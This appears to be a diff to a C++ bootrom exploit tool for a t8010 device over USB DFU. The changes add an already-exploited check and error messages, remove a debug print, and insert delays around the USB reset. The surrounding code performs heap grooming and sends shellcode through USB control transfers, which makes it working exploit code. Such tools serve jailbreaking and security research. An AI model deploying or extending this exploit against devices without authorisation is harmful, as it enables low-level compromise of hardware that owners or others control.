@@ -318,10 +318,18 @@ int main(int argc, char *argv[]) {
 
   // Run exploit (t8010 specific)
   DFU D;
-  printf("[*] stage 1, heap grooming ...\n");
   if (!D.acquire_device()) {
+    printf("[!] Failed to find device!\n");
     return 1;
   }
+
+  if (D.isExploited()) {
+    printf("[!] Device is already exploited! Aborting!\n");
+    return 0;
+  }
+
+  printf("[*] stage 1, heap grooming ...\n");
+
   D.stall();
   for (int i = 0; i < DC_t8010.hole; i++) {
     D.no_leak();
@@ -358,13 +366,16 @@ int main(int argc, char *argv[]) {
     if ((Size + i) > Shellcode.size()) {
       Size = Shellcode.size() - i;
     }
-    printf("%d\n", Size);
-
     D.libusb1_no_error_ctrl_transfer(0x21, 1, 0, 0, Shellcode.data() + i, Size,
                                      100);
   }
+
+  sleep_ms(500);
+
   D.usb_reset();
   D.release_device();
+
+  sleep_ms(500);
 
   // Check if device is pwned ...
   D.acquire_device();
